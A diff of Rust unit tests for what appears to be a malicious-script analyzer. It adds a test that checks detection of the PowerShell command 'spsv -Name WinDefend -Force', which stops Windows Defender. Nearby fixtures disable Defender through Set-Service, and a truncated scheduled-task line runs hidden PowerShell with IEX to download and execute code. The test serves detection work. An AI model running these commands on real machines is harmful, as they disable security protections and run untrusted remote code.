@@ -2882,6 +2882,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_stop_service_alias_emits_defender_evasion_trait() {
+        let script = br#"powershell -Command "spsv -Name WinDefend -Force""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "powershell-stop-service" && target == "WinDefend"
+            )),
+            "PowerShell spsv WinDefend was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_set_service_disabled_emits_defender_evasion_trait() {
         let script = br#"powershell -Command "Set-Service WinDefend -StartupType Disabled""#;
         let report = analyze(script, &AnalyzeConfig::default());
